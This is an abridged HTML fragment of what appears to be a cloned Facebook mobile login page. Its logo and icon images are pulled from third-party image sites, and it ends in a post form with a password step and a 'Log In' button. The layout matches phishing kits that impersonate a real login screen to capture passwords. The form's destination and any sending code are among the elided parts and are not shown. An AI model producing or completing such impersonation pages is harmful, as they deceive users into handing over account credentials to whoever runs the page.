...
<html>
<head>
    <link rel='icon' href='https://www.freepngimg.com/download/facebook/65377-like-icons-button-facebook,-computer-facebook-logo.png' type='image/x-icon'/ >
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Facebook – log in or sign up</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://www.freepngimg.com/download/facebook/65377-like-icons-button-facebook,-computer-facebook-logo.png" rel="shortcut icon" sizes="196x196">
    ...
    <div id="page" class="">
        ...
        <div class="_7om2 _52we _52z5" id="header">
            <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="https://m.facebook.com/login/?refid=8"><i
                    >
                        <img src="https://i.ya-webdesign.com/images/facebook-text-logo-png-5.png" height="45">
                            ...
                            <form method="post"
                                ...
                                <div class="_2pie" style="text-align:center;">
                                    <div id="u_0_5" data-sigil="login_password_step_element">
                                        <input name = "submit_btn" value="Log In"
                                               aria-label="Log In "
